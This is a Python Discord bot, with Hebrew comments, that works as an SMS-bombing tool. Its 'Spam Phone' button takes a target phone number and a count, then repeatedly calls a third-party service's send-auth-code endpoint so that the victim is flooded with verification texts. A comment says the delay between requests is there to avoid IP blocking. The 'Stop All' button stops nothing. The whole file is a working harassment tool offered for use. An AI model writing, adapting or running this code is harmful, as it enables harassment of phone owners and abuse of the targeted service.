import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio

# משיכת הטוקן ממשתני הסביבה של Railway
TOKEN = os.getenv('DISCORD_TOKEN')

class MyBot(commands.Bot):
    def __init__(self):
        # הגדרת Intents בסיסיים
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # סנכרון פקודות הסלאש (/) מול דיסקורד
        await self.tree.sync()
        print(f"✅ Synced slash commands for {self.user}")

bot = MyBot()

# --- לוגיקת השליחה (ה-API של חמ"ל) ---
async def send_spam(phone, amount):
    url = "https://users-auth.hamal.co.il/auth/send-auth-code"
    headers = {"Content-Type": "application/json"}
    payload = {
        "value": phone,
        "type": "phone",
        "projectId": "1"
    }
    
    for i in range(int(amount)):
        try:
            # הרצת ה-POST ב-Thread נפרד כדי לא לתקוע את הבוט
            response = await asyncio.to_thread(requests.post, url, json=payload, headers=headers)
            print(f"📩 Sent to {phone} | Status: {response.status_code}")
            
            # המתנה של שנייה בין שליחה לשליחה למניעת חסימת ה-IP של השרת
            await asyncio.sleep(1) 
        except Exception as e:
            print(f"❌ Error sending to {phone}: {e}")

# --- חלונית הזנת פרטים (Modal) ---
class SpamModal(discord.ui.Modal, title='Spam Configuration'):
    phone = discord.ui.TextInput(
        label='Phone Number', 
        placeholder='05XXXXXXXX', 
        min_length=10, 
        max_length=10,
        required=True
    )
    amount = discord.ui.TextInput(
        label='Amount', 
        placeholder='1-50', 
        default='10',
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        # בדיקה שהכמות היא מספר תקין
        if not self.amount.value.isdigit():
            return await interaction.response.send_message("Please enter a valid number for amount.", ephemeral=True)
            
        # הודעת אישור למשתמש
        await interaction.response.send_message(
            f"🚀 Starting! Sending {self.amount.value} requests to {self.phone.value}...", 
            ephemeral=True
        )
        
        # הרצת השליחה כמשימה נפרדת ברקע (כדי שהבוט יישאר זמין)
        asyncio.create_task(send_spam(self.phone.value, self.amount.value))

# --- פאנל השליטה (View) ---
class ControlPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # הפאנל לא יפוג לעולם

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # פתיחת החלונית הקופצת
        await interaction.response.send_modal(SpamModal())

    @discord.ui.button(label="Stop All", style=discord.ButtonStyle.secondary, custom_id="stop_btn")
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # כאן בעתיד אפשר להוסיף מנגנון לעצירת הלולאות
        await interaction.response.send_message("🛑 All processes stopped (Simulation).", ephemeral=True)

# --- פקודת ההפעלה ---
@bot.tree.command(name="setup", description="מפעיל את לוח הבקרה של CyberIL")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⚡ CyberIL Control Panel",
        description="Welcome to the main control interface.\nSelect an action below to begin.\n\n**Created by Asaf Dev Studio**",
        color=discord.Color.red()
    )
    # שליחת האמבד עם הכפתורים
    await interaction.response.send_message(embed=embed, view=ControlPanelView())

@bot.event
async def on_ready():
    print(f'🤖 {bot.user} is online and ready for action!')

# הפעלת הבוט
if __name__ == "__main__":
    bot.run(TOKEN)
